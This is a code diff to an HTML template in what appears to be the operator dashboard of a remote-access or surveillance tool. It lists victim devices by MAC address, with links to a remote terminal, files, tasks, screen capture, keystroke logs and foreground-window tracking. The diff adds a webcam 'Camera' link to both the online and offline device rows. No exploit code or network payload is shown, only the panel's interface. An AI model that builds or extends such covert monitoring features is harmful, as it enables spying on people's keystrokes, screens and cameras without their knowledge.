@@ -387,7 +387,7 @@ def render_device_tables():
         <td data-label="Version">v{{ info.ver }}<br><button class="mini {{ 'test' if info.get('is_test') else '' }}" onclick="toggleTest('{{ mac }}')">{{ 'Test' if info.get('is_test') else 'Stable' }}</button></td>
         <td data-label="Focus" class="focus" title="{{ info.fg|default('none') }}">{{ info.fg|default('none') }}</td>
         <td data-label="Last seen">{{ info.last_seen }}</td>
-        <td data-label="Actions" class="actions"><button class="mini" onclick="toggleTest('{{ mac }}')">Channel</button><a class="mini link" href="/terminal/{{ mac }}">Terminal</a><a class="mini link" href="/files/{{ mac }}">Files</a><a class="mini link" href="/taskmgr/{{ mac }}">Tasks</a><a class="mini link" href="/screen/{{ mac }}">Screen</a><a class="mini link" href="/view_log/{{ mac }}">Logs</a><a class="mini link" href="/entertainment/{{ mac }}">Media</a></td>
+        <td data-label="Actions" class="actions"><button class="mini" onclick="toggleTest('{{ mac }}')">Channel</button><a class="mini link" href="/terminal/{{ mac }}">Terminal</a><a class="mini link" href="/files/{{ mac }}">Files</a><a class="mini link" href="/taskmgr/{{ mac }}">Tasks</a><a class="mini link" href="/screen/{{ mac }}">Screen</a><a class="mini link" href="/camera/{{ mac }}">Camera</a><a class="mini link" href="/view_log/{{ mac }}">Logs</a><a class="mini link" href="/entertainment/{{ mac }}">Media</a></td>
         <td data-label="Status"><span class="pill online">Online</span></td>
       </tr>
       {% else %}<tr><td colspan="8" class="empty">No active devices.</td></tr>{% endfor %}
@@ -403,7 +403,7 @@ def render_device_tables():
         <td data-label="Network"><code>{{ info.get('ip', 'unknown') }}</code><br><span class="subtle">{{ info.get('location', '') }}</span></td>
         <td data-label="Version">v{{ info.ver }}<br><span class="pill {{ 'test' if info.get('is_test') else 'stable' }}">{{ 'Test' if info.get('is_test') else 'Stable' }}</span></td>
         <td data-label="Last seen">{{ info.last_seen }}</td>
-        <td data-label="Actions" class="actions"><button class="mini danger" onclick="deleteClient('{{ mac }}')">Delete</button><a class="mini link" href="/terminal/{{ mac }}">Terminal log</a><a class="mini link" href="/view_log/{{ mac }}">Run log</a><a class="mini link" href="/keylog/{{ mac }}">Key log</a></td>
+        <td data-label="Actions" class="actions"><button class="mini danger" onclick="deleteClient('{{ mac }}')">Delete</button><a class="mini link" href="/terminal/{{ mac }}">Terminal log</a><a class="mini link" href="/camera/{{ mac }}">Camera</a><a class="mini link" href="/view_log/{{ mac }}">Run log</a><a class="mini link" href="/keylog/{{ mac }}">Key log</a></td>
         <td data-label="Status"><span class="pill offline">Offline</span></td>
       </tr>
       {% else %}<tr><td colspan="7" class="empty">No offline records.</td></tr>{% endfor %}
